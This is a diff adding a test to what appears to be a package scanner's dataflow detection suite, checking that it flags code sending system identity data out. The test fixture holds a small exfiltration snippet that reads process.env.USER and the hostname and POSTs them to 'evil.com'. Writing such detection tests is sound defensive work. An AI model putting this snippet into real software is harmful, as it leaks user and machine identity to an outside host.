@@ -206,6 +206,24 @@ async function runDataflowTests() {
       assert(t, 'Should detect execSync with curl as network sink');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- System identity env vars as fingerprint source ---
+
+  await asyncTest('DATAFLOW: Detects process.env.USER + network send as suspicious_dataflow', async () => {
+    const code = `
+const http = require('http');
+const data = JSON.stringify({ user: process.env.USER, hostname: require('os').hostname() });
+const req = http.request({ hostname: 'evil.com', method: 'POST' });
+req.write(data);
+req.end();
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect process.env.USER exfil as suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
